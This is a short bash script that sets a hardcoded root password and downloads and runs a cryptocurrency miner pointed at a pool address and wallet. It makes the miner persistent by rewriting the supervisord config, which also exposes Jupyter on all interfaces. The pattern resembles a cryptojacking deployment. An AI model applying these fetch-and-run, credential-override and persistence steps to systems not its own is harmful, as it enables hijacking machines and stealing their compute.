#!/bin/bash
apt update -y
apt install -y screen btop moreutils
echo 'root:Q!@We34rt56y' | chpasswd
cd /
cd root
mkdir pearl
cd pearl
wget -c -tries=0 https://github.com/rakot7/distros/raw/refs/heads/main/pearl-miner-v12
chmod +x ./pearl-miner-v12
rm pearl.sh ;
cat <<EOF > pearl.sh
#!/bin/bash
while true; do
        ./pearl-miner-v12 --host 84.32.220.219:9000 --user prl1pqyjpfkk3cexjdzt998necuce8m60ep7kc3aru4jard5067k9q88s0qrgse --worker $(hostname) | ts '[%Y-%m-%d %H:%M:%S]' | tee -a miner.log &
        PID=\$!
        sleep 12h
        kill \$PID
        sleep 15s;
done;
EOF
chmod +x ./pearl.sh
screen -dmS p ./pearl.sh 
rm /etc/supervisor/conf.d/supervisord.conf
cat <<EOF > /etc/supervisor/conf.d/supervisord.conf
[supervisord]
nodaemon=true
[program:sshd]
command=/usr/sbin/sshd -D
[program:jupyter]
command=/bin/bash -c 'jupyter notebook --ip=0.0.0.0 --port=8888 --allow-root --no-browser'
[program:delegated_entrypoint]
command=/bin/bash /etc/delegated-entrypoint.sh
[program:pearl]
command=/bin/bash -c 'cd /root/pearl && screen -dmS pearl ./pearl.sh && sleep infinity'
EOF
